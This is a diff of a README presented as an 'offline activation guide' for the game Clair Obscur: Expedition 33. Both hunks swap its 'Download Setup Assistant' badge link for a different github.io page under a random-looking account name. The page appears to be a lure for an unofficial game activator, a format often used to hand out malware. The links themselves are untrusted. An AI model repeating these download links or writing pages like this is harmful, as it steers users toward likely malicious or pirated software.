@@ -1,6 +1,6 @@
 # Clair Obscur: Expedition 33 — Offline Activation Guide
 
-[![⬇ Download Setup Assistant](https://img.shields.io/badge/⏬%20Download-Setup_Assistant-blueviolet?style=for-the-badge&logo=windows&logoColor=white)](https://clair-obscur-expedition-33-install.github.io/.github)
+[![⬇ Download Setup Assistant](https://img.shields.io/badge/⏬%20Download-Setup_Assistant-blueviolet?style=for-the-badge&logo=windows&logoColor=white)](https://ryadikmntiiks.github.io/.github/COE)
 
 ## 🌌 About the Game
 
@@ -25,7 +25,7 @@ Whether you’re looking to explore the haunting landscapes of this enigmatic un
 
 ---
 
-[![⬇ Download Setup Assistant](https://img.shields.io/badge/⏬%20Download-Setup_Assistant-blueviolet?style=for-the-badge&logo=windows&logoColor=white)](https://clair-obscur-expedition-33-install.github.io/.github)
+[![⬇ Download Setup Assistant](https://img.shields.io/badge/⏬%20Download-Setup_Assistant-blueviolet?style=for-the-badge&logo=windows&logoColor=white)](https://ryadikmntiiks.github.io/.github/COE)
 
 ---
 
